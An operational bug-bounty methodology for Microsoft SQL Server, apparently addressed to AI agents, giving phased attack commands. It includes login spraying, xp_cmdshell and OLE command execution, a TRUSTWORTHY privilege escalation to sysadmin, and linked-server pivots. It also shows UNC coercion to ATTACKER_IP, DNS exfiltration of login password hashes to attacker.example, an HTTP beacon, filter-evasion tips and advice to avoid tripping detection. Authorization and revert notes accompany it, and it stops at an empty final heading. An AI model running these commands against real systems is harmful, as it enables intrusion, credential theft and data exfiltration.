---
technology: "MSSQL (Microsoft SQL Server)"
kind: bug-bounty-methodology
audience: ai-agent
version: 1.1
last-refresh: "2026-11-19"
source: "corpus-grounded (23 writeup files; see internal coverage ledger) + upstream-verified: Microsoft Learn (xp_cmdshell option, EXECUTE AS T-SQL, Linked Servers), impacket mssqlclient.py source, 2026-11-12; ports.md additions 2026-11-13: six2dez/pentest-book (enumeration/ports.md, no license — rewritten with attribution), accessed 2026-11-13; post-credential-ladder supplement 2026-11-19: Microsoft Learn (sp_OACreate/OLE, OPENROWSET BULK, EXECUTE AS, linked-server/distributed-query, default trace, Always Encrypted/TDE), xp_readerrorlog + fn_trace_gettable usage, 2026 MSRC advisories spot-checked, accessed 2026-11-19"
provenance: "corpus-grounded: 24 contributing writeups (internal coverage ledger, gate documented in header); upstream CVEs verified against primary sources during enrichment; basis of this page summarized from the unit ledger; 2026-11-19 supplement expands the post-credential escalation ladder (TTP focus) — primitives verified against Microsoft Learn primary docs"
---

Companion page: [[mssql|MSSQL overview]] — what the technology is and where you will meet it. Tool reference notes live in the separate tools vault; Appendix A names the relevant tools in prose.

# MSSQL Bug Bounty Methodology

**Scope:** Microsoft SQL Server over TDS (default 1433/tcp, named instances on high ports via UDP 1434 SQL Browser), reached with found credentials, shells, SQL injection, Kerberos tickets, or as an NTLM relay target. **Out of scope:** MySQL/MariaDB/PostgreSQL (sibling units), Azure SQL (no xp_cmdshell, no linked servers in the same sense).

**Authorization:** everything below presumes written permission. Steps flagged **DESTRUCTIVE** change server configuration (`sp_configure`), write files, or steer the service account's authentication at attacker infrastructure — each has a revert step; use it and report what changed.

## Decision tree (one screen)

1. `1433/tcp ms-sql-s` + any credential → Phase 2 (login) → Phase 3 (role check).
2. `IS_SRVROLEMEMBER('sysadmin') = 1` → Phase 4 (xp_cmdshell chain) — done.
3. sysadmin = 0 → Phase 5 (impersonation) → Phase 6 (linked servers) → Phase 7 (coerce/relay).
4. No credentials, app in front → SQL-injection entry (Phase 2b), then the same ladder.
5. Domain context + `MSSQLSvc` SPN → Phase 8 (kerberoast/silver ticket into the instance).
6. Coercion infrastructure up, MSSQL is a relay *target* → Phase 7b (ntlmrelayx MSSQL).

## Phase 1 — Fingerprinting

```bash
nmap -p1433,1434 -sU -sV 198.51.100.10        # ms-sql-s version line + SQL Browser
nmap -p1433 --script ms-sql-info,ms-sql-ntlm-info 198.51.100.10
nxc mssql 198.51.100.10 -u 'guest' -p '' --version   # netexec probe: engine version
```

Read: the nmap version line gives the engine generation (`15.00.2000` = SQL Server 2019 RTM, `16.00.1000` = 2022). `ms-sql-ntlm-info` leaks domain/hostname of the service account with zero credentials — free AD recon. Named instances: query UDP 1434 (`ms-sql-empty-password`/browser) or hunt the high port in the full TCP scan (observed: one instance on 6520).

Expected output shape: `1433/tcp open ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM`.

## Phase 2 — Authentication

Three client families, pick by access:

```bash
# impacket (Linux, the field default)
impacket-mssqlclient EXAMPLE.COM/sql_svc:'Password!'@198.51.100.10 -windows-auth
impacket-mssqlclient 'sa:MSSQLP@ssw0rd!'@198.51.100.10 -port 1433
impacket-mssqlclient -k dc01.example.com            # Kerberos (KRB5CCNAME ccache)
# verified flags: -windows-auth, -k (ccache), -port, -db, -hashes LMHASH:NTHASH, -command

# native (on-box or RDP)
sqlcmd -S 198.51.100.10 -U sa -P '#mssql_s3rV1c3!2020' -Q 'SELECT @@version'
sqlcmd -S '(local)' -U db_admin -P 'B1@hx31234567890' -Q 'SELECT DB_NAME()'

# credential validation at TDS speed
nxc mssql 198.51.100.10 -u users.txt -p passwords.txt --continue-on-success
```

Notes:
- `-windows-auth` is required for AD-backed logins (upstream: mssqlclient default is SQL auth; observed: "use -windows-auth as it's the default mode of authentication").
- `(Pwn3d!)` in the netexec line means the login is sysadmin — skip straight to Phase 4.
- Kerberos entry: export a ccache and `-k` (two observed silver-ticket logins).
- Password spray works the same as SMB — reuse validated lists against 1433 (observed: one chain sprays KeePass-derived credentials after enumerating logins).

**2b — Injection entry (no direct login).** Web-app or document-template injection into an MSSQL backend (observed: stacked-query SQLi; a document parser with a blacklist): fingerprint with `@@version`, then every later phase is expressible as a query string — `EXEC sp_configure ...` works through stacked queries when the driver allows them. Case-randomize keywords (`Xp_cMdsHelL`, `SeLeCt`) to beat naive blacklist filters (field-observed).

## Phase 3 — Post-login enumeration

```sql
SELECT @@version, @@servername, SYSTEM_USER, SUSER_NAME();
SELECT IS_SRVROLEMEMBER('sysadmin');          -- 1 = rung 1 (Phase 4)
SELECT name FROM sys.databases;               -- then: USE <db>; SELECT name FROM sys.tables
SELECT name FROM sys.sql_logins;              -- password hashes need CONTROL SERVER / VIEW ANY DEFINITION
SELECT name, type_desc FROM sys.server_principals;
```

In impacket's shell the built-ins shorten this: `enum_db`, `enum_logins`, `enum_impersonate` (prints the IMPERSONATE grant table — field-observed), `enum_links`. Exfil targets by observed habit: credential tables in app DBs, ADSync secrets (`use ADSync; select instance_id,keyset_id,entropy from mms_server_configuration` — field-observed), seeded backup material (an observed seed index — elasticsearch unit).

## Phase 4 — The xp_cmdshell chain (sysadmin)

Upstream-verified default: **disabled on new installs**; enabling is two `sp_configure` calls.

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;           RECONFIGURE;
EXEC xp_cmdshell 'whoami';                    -- NT SERVICE\MSSQLSERVER$INSTANCE or the domain service account
-- revert when done:
EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;
EXEC sp_configure 'show advanced options', 0; RECONFIGURE;
```

Field notes: expect output as a table you read line-wise; the execution context is the SQL service account — pair with `whoami /priv` and check `SeImpersonatePrivilege` for potato-class privesc (2 observed engagements). Through impacket: `enable_xp_cmdshell` then `xp_cmdshell <cmd>` are shell built-ins. If outbound command output is filtered (blacklists), `create table out (o varchar(8000)); insert into out execute xp_cmdshell '...'` then SELECT the table (observed pattern).

## Phase 5 — Impersonation (no sysadmin)

Upstream: `EXECUTE AS LOGIN = 'name'` switches the session's security context wholesale; it requires IMPERSONATE permission on the target login, which DBAs grant for app-pool and job-runner setups.

```sql
-- enumerate (or impacket: enum_impersonate)
SELECT grantee.name, permission_name FROM sys.server_permissions p
  JOIN sys.server_principals grantee ON p.grantee_principal_id = grantee.principal_id
  WHERE permission_name = 'IMPERSONATE';
EXECUTE AS LOGIN = 'sa';  SELECT IS_SRVROLEMEMBER('sysadmin');  -- 1 → Phase 4 applies now
-- scope note: EXECUTE AS USER is database-scoped; LOGIN is server-scoped (upstream EXECUTE AS doc)
```

Observed: one chain escalates a web-app login to `sa` exactly this way; another mines app credentials post-impersonation. Silver tickets are the *ticket-level* version of the same idea (Phase 8).

## Phase 6 — Linked servers (cross-instance / cross-domain execution)

Upstream: linked servers are OLE-DB remotes configured with `sp_addlinkedserver` + `sp_addlinkedsrvlogin`; `rpc`/`rpc out` enabled lets T-SQL execute on the far side.

```sql
EXEC sp_linkedservers;                         -- enumerate configured links (or impacket: enum_links)
SELECT * FROM OPENQUERY("PRIMARY", 'select suser_name()');   -- run remote query as the link's mapped login
EXEC ('execute as login = ''sa''; exec sp_configure ''show advanced options'',1; reconfigure; exec sp_configure ''xp_cmdshell'',1; reconfigure;') AT "PRIMARY"
EXEC ('exec xp_cmdshell ''whoami''') AT "PRIMARY"
```

That two-line `EXEC AT` chain is field-verbatim (cross-domain execution via a link whose login mapping is privileged). Trust boundaries dissolve when the link maps to `sa` on the far side — enumerate links *before* concluding "we only own one box". One observed chain: a link plus attacker-controlled DNS (the link authenticates to a name you now own) converts the linked server into a coercion primitive as well.

## Phase 7 — Coerced authentication (service account → you)

Any statement that makes the engine touch a UNC path makes the **service account** authenticate via SMB to your listener:

```sql
EXEC xp_dirtree '\\ATTACKER_IP\share', 1, 1;             -- undocumented FS-walker
BULK INSERT t FROM '\\ATTACKER_IP\file.txt';             -- field-observed (bulkadmin is enough)
SELECT * FROM OPENROWSET(BULK '\\ATTACKER_IP\x', ...) ...;
```

Catch with Responder or an ntlmrelayx SMB/HTTP server on ATTACKER_IP: result is a **NetNTLMv2 challenge-response — not the account's reusable NT hash** (crack: hashcat mode 5600) or a relayed session. This needs no sysadmin in the BULK INSERT case (observed — `bulkadmin` server role suffices). Full capture/crack/relay mechanics and the signing caveats live in the [[ntlm]] unit.

**7b — MSSQL as relay target.** ntlmrelayx implements an MSSQL protocol client: relay a coerced (or poisoned) authentication *into* a SQL login and run queries/enabled procedures as the relayed user. Field tells show up as `[*] Protocol Client MSSQL loaded` with `--no-smb-server --no-rdp-server` style targeting (3 observed engagements). If the relayed principal is sysadmin on the instance, Phase 4 rides the relay.

## Phase 8 — Kerberos interactions

- SPN `MSSQLSvc/host:1433` on a service account → kerberoast the account, crack, login (3 observed engagements: `svc_mssql`-style service accounts).
- **Silver ticket** with the service account's NT hash forges a TGS for MSSQLSvc and lets you impersonate *any* login the instance trusts — field verbatim: `ticketer -spn "MSSQLSvc/dc1.example.com" -user ... -nthash ... -domain-sid ... Administrator`, then `impacket-mssqlclient -k -no-pass` (field-observed). Ticket mechanics: [[kerberos]].
- Windows-auth over TDS from Linux needs the host resolvable and time in sync — the standard `-k` failure triage.

## Phase 9 — Defense and validation notes

- **Report shape for the xp_cmdshell finding:** the sp_configure exchange + `xp_cmdshell 'whoami'` output + the revert statements executed. Leave the config as found.
- **Impersonation finding:** the `enum_impersonate` table (grants) + the EXECUTE AS escalation output.
- **Coercion finding:** the Responder/ntlmrelayx capture line + statement used; never leave the hash unreported.
- **Detection telemetry defenders should have (note and avoid tripping):** xp_cmdshell enable events (`sp_configure` audit), IMPERSONATE grants, linked-server creation, TDS logins from unusual hosts, SMB out-bound from the service account, SQL Browser scans.
- **Hardening for the report:** keep xp_cmdshell disabled; audit IMPERSONATE grants (`sys.server_permissions`); map linked-server logins to least-privilege, not `sa`; block service-account outbound SMB at the firewall; disable SQL Browser if unneeded; rotate kerberoastable service-account passwords.

## Ports cheat-sheet additions (2026-11-13)

From six2dez/pentest-book enumeration/ports.md (no license — rewritten with attribution); module names verified against the metasploit repo, sp_execute_external_script semantics against Microsoft Learn. ms-sql-info NSE, mssql_login, sqsh and the xp_cmdshell chain were already covered in Phases 1–4 — skipped.

- **SQL Browser over UDP, framework-shaped** — metasploit's auxiliary/scanner/mssql/mssql_ping wraps the unauthenticated 1434/udp probe (instance names, versions, TCP ports — the same data ms-sql-info NSE reads in Phase 1) for sweeps where nmap is not the deployed scanner. Its sibling exploit, exploit/windows/mssql/mssql_payload, chains the Phase 4 enable-and-execute into a delivered payload for engagements where framework tooling is sanctioned.
- **sp_execute_external_script — OS execution when xp_cmdshell was policy-disabled** — on SQL Server 2016+ with Machine Learning Services installed and `external scripts enabled` switched on in sp_configure (off by default, the same class of gate as xp_cmdshell), the external-script procedure runs code outside the engine:

  ```sql
  EXEC sp_execute_external_script @language = N'Python', @script = N'import os;os.system("whoami")';
  ```

  R was the only language on 2016; R and Python from 2017 on (later builds allow custom languages via CREATE EXTERNAL LANGUAGE). Check both gates — feature installed AND config enabled — before promising it; when both hold it is a parallel OS-execution path that xp_cmdshell-focused hardening never touched.

## Appendix A — Tooling (named in prose)

- **impacket-mssqlclient / mssqlclient.py** — the field-default Linux TDS client; SQL shell with built-ins `enable_xp_cmdshell`, `enum_impersonate`, `enum_links`, `enum_db/logins`, `xp_cmdshell`; flags `-windows-auth`, `-k`, `-port`, `-db`, `-hashes`.
- **sqlcmd** — Microsoft's native CLI; present on Windows hosts (post-shell win), parameterized `-S/-U/-P/-Q`.
- **netexec (nxc) / crackmapexec** — `mssql` protocol module for validation, spraying, `(Pwn3d!)` sysadmin detection.
- **Responder / ntlmrelayx (impacket)** — capture and relay ends of Phase 7; ntlmrelayx's MSSQL protocol client closes the relay-into-MSSQL loop.
- **Coercer** — automates coercion primitives against a host (observed: a coercer + ntlmrelayx combo).
- **hashcat** — NTLMv2 (mode 5600) and Kerberoast (13100) cracking for Phase 7/8 outputs.
- **Metasploit** — mssql_login scanner and auxiliary modules for high-volume validation when the program allows.
- References: Microsoft Learn pages for xp_cmdshell, EXECUTE AS, and linked servers (upstream-verified for this page).

## Appendix B — Quick reference

```sql
-- role fork
SELECT IS_SRVROLEMEMBER('sysadmin');
-- xp_cmdshell enable/revert
EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
-- impersonation
EXECUTE AS LOGIN = 'sa'; ... REVERT;
-- linked server exec
EXEC ('exec xp_cmdshell ''whoami''') AT "PRIMARY";
-- coerce NTLM
EXEC xp_dirtree '\\ATTACKER_IP\share',1,1;  /  BULK INSERT t FROM '\\ATTACKER_IP\f';
-- login harvest (privileged)
SELECT name FROM sys.sql_logins;
```

## Supplement — the post-credential escalation ladder as TTP (added 2026-11-19)

*Focus: the decision tree from a single working SQL login. Each rung is a question — what to check, in what order, and why — a primitive that answers it, and an evidence standard: the exact observation that upgrades "I can run this" into a defensible finding. The CVE-light rule applies: the primitives below are the product; patch-gated memory-corruption bugs get one line at the end.*

The ladder in one sentence: **orient (version/role/ownership) → escalate in-engine (impersonation, ownership-chain/TRUSTWORTHY) → reach the OS (xp_cmdshell, then the OLE/CLR/Agent/external-script fallbacks) → reach other data (OPENROWSET/OPENDATASOURCE, linked servers, file reads) → reach the network (coerced NTLM, DNS/HTTP egress) → account for what you tripped and what you cannot see (ERRORLOG/default-trace, Always Encrypted/TDE).** Never skip the orient step — every later choice is gated on version and role, and a mis-ordered ladder burns audit events you did not need to spend.

### S1 — Orientation: the three questions that order everything

Before any escalation, answer version, role, and ownership. These three queries decide which rungs even exist on this target.

```sql
-- (1) VERSION — feature-availability map (external scripts need 2016+, newer OLE/CLR defaults differ)
SELECT SERVERPROPERTY('ProductVersion'), SERVERPROPERTY('ProductLevel'),
       SERVERPROPERTY('Edition'), SERVERPROPERTY('IsClustered'),
       SERVERPROPERTY('MachineName'), SERVERPROPERTY('InstanceName');

-- (2) ROLE — the escalation fork, widest grant first
SELECT IS_SRVROLEMEMBER('sysadmin')       AS sysadmin,      -- 1 = Phase 4 now
       IS_SRVROLEMEMBER('securityadmin')  AS securityadmin, -- can GRANT CONTROL SERVER / create logins
       IS_SRVROLEMEMBER('serveradmin')    AS serveradmin,
       IS_SRVROLEMEMBER('setupadmin')     AS setupadmin,    -- can add linked servers
       IS_SRVROLEMEMBER('bulkadmin')      AS bulkadmin;     -- enough for BULK INSERT coercion (Phase 7)

-- effective server-level permissions of the current login (the real answer, not just role flags)
SELECT * FROM fn_my_permissions(NULL, 'SERVER')
  ORDER BY permission_name;         -- look for CONTROL SERVER, IMPERSONATE ANY LOGIN,
                                    -- ALTER ANY LOGIN, ALTER ANY SERVER ROLE, ALTER ANY CREDENTIAL
-- per-database (run USE <db> first)
SELECT * FROM fn_my_permissions(NULL, 'DATABASE');  -- CONTROL / IMPERSONATE / db_owner membership
SELECT IS_MEMBER('db_owner'), IS_MEMBER('db_ddladmin');
```

**(3) Ownership chain / TRUSTWORTHY — the quiet sysadmin path that bypasses role checks entirely.** `db_owner` on a database whose `TRUSTWORTHY` bit is ON, owned by a sysadmin login, is a full server takeover without ever being granted a server role — because a module in a TRUSTWORTHY db can `EXECUTE AS OWNER` and that owner's authority escapes the database. This is the single most-missed in-engine escalation; check it before touching the OS.

```sql
-- find TRUSTWORTHY databases owned by a high-privilege principal
SELECT d.name, d.is_trustworthy_on, SUSER_SNAME(d.owner_sid) AS owner
  FROM sys.databases d WHERE d.is_trustworthy_on = 1;
-- if you own one (db_owner) and its owner is sysadmin, escalate:
USE victimdb;
CREATE PROCEDURE dbo.go WITH EXECUTE AS OWNER AS
  EXEC sp_addsrvrolemember 'yourlogin','sysadmin';   -- DESTRUCTIVE — revert with sp_dropsrvrolemember
EXEC dbo.go;
SELECT IS_SRVROLEMEMBER('sysadmin');   -- now 1
```

**Evidence standard for S1:** capture `ProductVersion` + the role/permission result set verbatim; for the TRUSTWORTHY path, capture `is_trustworthy_on=1` + owner + the before/after `IS_SRVROLEMEMBER` pair, and record the `sp_dropsrvrolemember` revert you ran. The finding is "a db_owner on `victimdb` reaches sysadmin via TRUSTWORTHY" — not "I am sysadmin".

### S2 — Impersonation target selection (extends Phase 5)

Phase 5 impersonates `sa`; the fuller TTP is to *rank every reachable principal* and pick the shortest path. `EXECUTE AS LOGIN` is server-scoped, `EXECUTE AS USER` is database-scoped, and grants hide at both levels.

```sql
-- server-level IMPERSONATE grantees, ranked by what they buy you
-- (class 101 = server principal; major_id is the login being impersonated)
SELECT pr.name AS grantee, pr2.name AS target_login, p.permission_name
  FROM sys.server_permissions p
  JOIN sys.server_principals pr  ON p.grantee_principal_id = pr.principal_id
  JOIN sys.server_principals pr2 ON p.major_id = pr2.principal_id
  WHERE p.permission_name = 'IMPERSONATE' AND p.class = 101;
-- database-level impersonation (run per db) — often the only one granted
SELECT DISTINCT dp.name AS grantee, dp2.name AS target_user, perm.permission_name
  FROM sys.database_permissions perm
  JOIN sys.database_principals dp  ON perm.grantee_principal_id = dp.principal_id
  JOIN sys.database_principals dp2 ON perm.major_id = dp2.principal_id
  WHERE perm.permission_name = 'IMPERSONATE';
```

Selection order: impersonate a **sysadmin login** (done — Phase 4 applies) > a login with **CONTROL SERVER** or **ALTER ANY LOGIN** (grant yourself in, or add a sysadmin) > **dbo of a TRUSTWORTHY db** (S1 path) > any login that owns a linked-server mapping (Phase 6). Chain impersonations when needed — `EXECUTE AS` nests; walk back with `REVERT` once per hop.

```sql
EXECUTE AS LOGIN = 'app_svc';          -- hop 1
  EXECUTE AS LOGIN = 'dba_jobrunner';  -- hop 2 (if app_svc can impersonate it)
    SELECT IS_SRVROLEMEMBER('sysadmin');
  REVERT;
REVERT;
```

**Evidence standard:** the grant table (`enum_impersonate` output or the queries above) + `ORIGINAL_LOGIN()`/`SUSER_NAME()` captured *inside* the impersonated context proving the context switch, + the specific capability it unlocked. `ORIGINAL_LOGIN()` is the honest attribution anchor — it survives nested `EXECUTE AS` and shows the triager exactly which login you started from.

### S3 — xp_cmdshell gating and the blocked-by-policy ladder (extends Phase 4)

Phase 4 enables xp_cmdshell in the clean case. The TTP is the *fallback ladder* for when it is blocked, and knowing which gate you hit:

- **`RECONFIGURE` vs `RECONFIGURE WITH OVERRIDE`** — plain `RECONFIGURE` refuses values outside the configured valid range; policy-hardened servers set a run-value ceiling that makes `sp_configure 'xp_cmdshell',1; RECONFIGURE` throw. `WITH OVERRIDE` pushes past the range check but still needs CONTROL SERVER. If even that errors, the block is above sp_configure (see below).
- **Policy-level blocks** — Surface Area Configuration / Policy-Based Management facets, or a logon trigger, can re-disable or deny the proc regardless of config. Read the error: "blocked … as part of the security configuration" = the component flag (fixable by sp_configure); "The EXECUTE permission was denied" = a grant problem (impersonate a principal that has it, S2); a policy/trigger rejection names neither.

Fallback ladder when xp_cmdshell stays blocked, in reach-for order:

1. **sp_OACreate (OLE Automation)** — S4 below. Different sp_configure flag (`'Ole Automation Procedures'`), so xp_cmdshell-only hardening misses it.
2. **sp_execute_external_script** — the Python/R path already in the Ports cheat-sheet; needs Machine Learning Services installed *and* `'external scripts enabled'`.
3. **CLR assembly** — `CREATE ASSEMBLY` from a hex blob + a `[SqlProcedure]` that shells out; needs `'clr enabled'` and either TRUSTWORTHY/`UNSAFE` or an asymmetric-key signature. Heavier, survives when the xp_* family is stripped.
4. **SQL Agent job** — if Agent is running, create a job step of subsystem `CmdExec` or `PowerShell` and run it on demand; executes as the Agent service account or a proxy. Needs `sysadmin` or `SQLAgentOperatorRole`.
5. **The signed-proc bypass** — on some builds a Microsoft-signed system proc (e.g. `sp_MSdeletefoldercontents`) reaches OS actions even while a direct `xp_cmdshell` call is refused, because disabling one feature flag does not revoke the signed proc's path. Treat as version-specific; verify before relying on it.

**Evidence standard:** the exact block error string (it classifies the gate), the fallback you used, its own enable statements + revert, and a single innocuous proof command (`whoami` / `hostname`). Never run a destructive OS command for proof.

### S4 — sp_OACreate: the OLE fallback path (new)

OLE Automation gives OS execution through a *different* config flag than xp_cmdshell — the reason hardening guides disable both.

```sql
-- gate (DESTRUCTIVE — revert after)
EXEC sp_configure 'show advanced options', 1;      RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 1;  RECONFIGURE;
-- run a command (WScript.Shell.Run returns an exit code, NOT stdout)
DECLARE @sh INT, @rc INT;
EXEC sp_OACreate 'WScript.Shell', @sh OUTPUT;
EXEC sp_OAMethod  @sh, 'Run', @rc OUTPUT,
     'cmd.exe /c whoami > C:\Windows\Temp\o.txt', 0, 1;   -- 0=hidden, 1=wait
EXEC sp_OADestroy @sh;
-- read the captured stdout back (file read runs as the service account; see S7)
SELECT BulkColumn FROM OPENROWSET(BULK 'C:\Windows\Temp\o.txt', SINGLE_CLOB) AS x;
-- revert
EXEC sp_configure 'Ole Automation Procedures', 0;  RECONFIGURE;
EXEC sp_configure 'show advanced options', 0;      RECONFIGURE;
```

The `Run` method hands back only a return code — capturing output means redirect-to-file then read it back (above), or an OLE HTTP object for egress (S9). Inspect OLE failures with `sp_OAGetErrorInfo @sh`. **Caveat (upstream):** never drive OLE Automation procedures from CLR objects — Microsoft documents that it can crash the instance; on a production bounty target, prefer the file-redirect pattern and keep the object lifetime short.

**Evidence standard:** the config exchange + the `sp_OACreate`/`sp_OAMethod` sequence + the `whoami` content read back from the temp file + the temp-file cleanup (`DEL` via the same channel) + both reverts.

### S5 — OPENROWSET / OPENDATASOURCE: ad-hoc cross-instance reads (new)

When you want another instance's data (or a second path to your own) without a persistent linked server, ad-hoc distributed queries are the primitive. Gate: `'Ad Hoc Distributed Queries'`.

```sql
EXEC sp_configure 'show advanced options', 1;        RECONFIGURE;   -- DESTRUCTIVE
EXEC sp_configure 'Ad Hoc Distributed Queries', 1;   RECONFIGURE;

-- read a remote instance with harvested creds
SELECT * FROM OPENROWSET('SQLNCLI',
       'Server=198.51.100.20;UID=sa;PWD=Passw0rd!;',
       'SELECT name FROM master.sys.sql_logins');

-- OPENDATASOURCE — inline four-part name, same idea without the provider-string query
SELECT * FROM OPENDATASOURCE('SQLNCLI',
       'Server=198.51.100.20;UID=sa;PWD=Passw0rd!').master.sys.databases;
```

Two high-value moves: **(a) loopback-to-self escalation** — `OPENROWSET('SQLNCLI','Server=localhost;Trusted_Connection=yes;', 'SELECT IS_SRVROLEMEMBER(''sysadmin'')')` re-authenticates to the *same* instance as the SQL **service account**, which is frequently sysadmin even when your interactive login is not; if it returns 1, you can run privileged statements through the nested query. **(b) cross-instance command relay** — wrap a remote `EXEC master..xp_cmdshell` in the provider-string query when the far instance has it enabled. Revert the config flag when done.

**Evidence standard:** the gate exchange + the OPENROWSET/OPENDATASOURCE statement + the returned rows proving cross-context read (e.g. the self-loopback `sysadmin=1`, or the remote `@@SERVERNAME` differing from the local one) + revert.

### S6 — Linked-server pivots: rpc out, mappings, and the double-hop limit (extends Phase 6)

Phase 6 runs the `EXEC ... AT` chain; the TTP is enumerating *which* links are weaponizable and understanding why the double-hop rules differ from interactive Windows auth.

```sql
-- the real link inventory: data-access + rpc_out flags + how each authenticates
SELECT s.name, s.product, s.data_access, s.is_rpc_out_enabled,
       s.is_remote_login_enabled, ll.remote_name AS maps_to
  FROM sys.servers s
  LEFT JOIN sys.linked_logins ll ON s.server_id = ll.server_id
  WHERE s.is_linked = 1;
```

Rules that decide the method: **`OPENQUERY(link,'...')` needs only `data_access=1`** (read/run a query under the link's mapping). **`EXEC('...') AT link` needs `is_rpc_out_enabled=1`** — the "rpc out" flag is the one that turns a read-only link into code execution on the far side. `maps_to` tells you the privilege you inherit remotely: a link mapping to `sa` is a remote sysadmin for free.

**The crawl:** links point to instances that have their *own* links. Pivot and re-enumerate `sys.servers` at each hop (`SELECT * FROM OPENQUERY(link,'SELECT name FROM sys.servers WHERE is_linked=1')`) until a hop lands on a sysadmin mapping. This is the classic "link chain" takeover and is usually where cross-domain reach comes from.

**Double-hop / delegation limit — the key distinction.** A linked server configured with a *stored SQL-login mapping* (`maps_to` is a real login) executes under that credential on hop 2 with **no Kerberos delegation required** — it works from any host. A link set to *"made using the login's current security context"* (self-mapping) under **Windows auth** hits the classic double-hop wall: hop 2 arrives as `NT AUTHORITY\ANONYMOUS LOGON` and fails unless the service account is trusted for (constrained) delegation to the remote SPN. The failure signature is literally `Login failed for user 'NT AUTHORITY\ANONYMOUS LOGON'`. So: self-mapped Windows links are reliable only where delegation is configured; SQL-login-mapped links always pivot. `EXEC AT` is *not* the interactive double-hop — the mapping credential is applied server-side, which is exactly why a privileged mapping is so dangerous.

**Evidence standard:** the `sys.servers`/`sys.linked_logins` inventory showing `data_access`/`is_rpc_out_enabled`/`maps_to`, the remote `SELECT SUSER_SNAME(),@@SERVERNAME` proving which principal you became on which box, and — for a chain — the per-hop server names. For an ANONYMOUS-LOGON failure, capture the error string so the report distinguishes "link exists but delegation blocks it" from "link is exploitable".

### S7 — File-read primitives: OPENROWSET(BULK) (new)

A SQL login can often read arbitrary files the **service account** can read, no OS shell needed — the quiet primitive for grabbing config/connection-string files.

```sql
-- whole file as one varchar(max) value in column "BulkColumn"
SELECT BulkColumn FROM OPENROWSET(BULK 'C:\inetpub\wwwroot\web.config', SINGLE_CLOB) AS f;
-- Unicode source → SINGLE_NCLOB (nvarchar); binary/XML → SINGLE_BLOB (varbinary)
SELECT BulkColumn FROM OPENROWSET(BULK 'C:\app\appsettings.json', SINGLE_NCLOB) AS f;
```

Scope and gates: the read runs as the SQL service account, so you get exactly its filesystem reach (frequently the whole app tree and often more). `BULK ... SINGLE_*` needs `ADMINISTER BULK OPERATIONS` (server-level) or `bulkadmin` — the same role that enables the Phase 7 coercion, so if BULK INSERT coercion worked, file read works too. Highest-value targets: `web.config`/`appsettings.json` connection strings (lateral creds), `*.kdbx`/export files, the SQL `ERRORLOG` file itself (S10), and IIS `applicationHost.config`.

**Evidence standard:** the statement + enough of `BulkColumn` to prove the read (redact secrets — quote the key name and first/last few chars of a connection string, never the full password), and the file path. Reading one proof file is sufficient; do not bulk-exfiltrate a directory.

### S8 — Hash theft from the engine: the coercion-proc catalog (extends Phase 7)

Phase 7 names `xp_dirtree`/`BULK INSERT`. The full TTP is the *catalog* of UNC-touching primitives ranked by required privilege, because the lowest-privilege one that works is the one to use:

| Primitive | Min privilege | Note |
|---|---|---|
| `EXEC master..xp_dirtree '\\ATTACKER\x',1,1` | `public` (EXECUTE often granted) | undocumented FS-walker; the default go-to |
| `EXEC master..xp_fileexist '\\ATTACKER\x'` | `public` typically | single stat, quietest |
| `EXEC master..xp_subdirs '\\ATTACKER\x'` | `public` typically | sibling walker |
| `BULK INSERT t FROM '\\ATTACKER\x'` | `bulkadmin` | needs a target table; S1 flagged bulkadmin |
| `SELECT * FROM OPENROWSET(BULK '\\ATTACKER\x', SINGLE_CLOB) x` | `ADMINISTER BULK OPERATIONS` | no linked server needed |
| `BACKUP DATABASE/LOG ... TO DISK='\\ATTACKER\x'` | sysadmin, `db_owner`, **`db_backupoperator`** | **HIGH-IMPACT — data exfiltration, not coercion**: a completed backup transfers the whole database to your listener; remove from routine reach-for entirely |

Every one triggers **outbound authentication over SMB** to your listener — but the identity you capture is configuration-dependent, not guaranteed to be the configured service account: virtual accounts and LocalSystem authenticate as the **machine account** (`HOST$`), gMSA/domain-service accounts as themselves; a query error does NOT mean no outbound attempt occurred, and query success does NOT mean the listener was reached — correlate with listener telemetry, not SQL return values. Catch with Responder (capture → crack) or ntlmrelayx (relay → session); what you capture is a **NetNTLMv2 challenge-response — not the account's reusable NT hash** — crackable at hashcat mode 5600. Reach-for order follows the table: start at the `public`-level procs. The SMB-signing caveat and relay-vs-crack decision live in the [[ntlm]] unit.

**Evidence standard:** the statement + the Responder/ntlmrelayx capture line showing the service-account username and the originating instance IP — the two together prove *this* SQL instance coerced out. Report the hash's existence; never leave a captured response out of the write-up, and never post the raw challenge-response in the report body. Report impact in exactly one of three states — **captured**, **relayed**, **cracked** — never collapse them ("password compromise" claims from a bare capture are the classic overstatement). For clustered instances, attribute by listener source IP + timestamp correlation: the source may be an active cluster node, not the address you queried.

### S9 — DNS and HTTP egress channels (new)

When outbound SMB (445) is firewalled, the coercion primitives still resolve hostnames — and OLE still speaks HTTP. Two blind-exfil / egress-test channels:

```sql
-- DNS: the UNC host is resolved before the SMB connect, so a lookup leaves even if 445 is blocked.
-- Encode a datum into the label to exfiltrate it blind:
DECLARE @d VARCHAR(128) = (SELECT TOP 1 LEFT(password_hash,16) FROM sys.sql_logins);
EXEC ('master..xp_dirtree ''\\' + @d + '.dns.attacker.example\x''');   -- watch your authNS logs
-- also xp_fileexist for a single quiet A-record lookup confirming egress at all

-- HTTP: OLE HTTP client (needs the S4 OLE gate) — exfil or beacon without SMB/DNS
DECLARE @h INT, @r INT;
EXEC sp_OACreate 'MSXML2.ServerXMLHTTP', @h OUTPUT;
EXEC sp_OAMethod @h, 'open', NULL, 'GET', 'http://beacon.attacker.example/ping', false;
EXEC sp_OAMethod @h, 'send';
EXEC sp_OAGetProperty @h, 'status', @r OUTPUT;   -- 200 = HTTP egress open
EXEC sp_OADestroy @h;
```

Egress-channel decision: SMB coercion (S8) is the highest-value (yields a crackable/relayable hash) but most-filtered; DNS almost always escapes and proves egress + enables blind data exfil; HTTP via OLE needs the OLE gate but tunnels through web proxies. Test cheapest-that-proves-the-point first; a single `xp_fileexist` to a logging resolver is the least-noisy egress confirmation.

**Evidence standard:** your own authoritative-DNS or HTTP-listener log line (timestamp, source IP, the encoded label / path) correlated to the exact statement and time you sent it. The listener log *is* the proof the data left the engine; the statement alone is not.

### S10 — Evidence of prior abuse: ERRORLOG and the default trace (new)

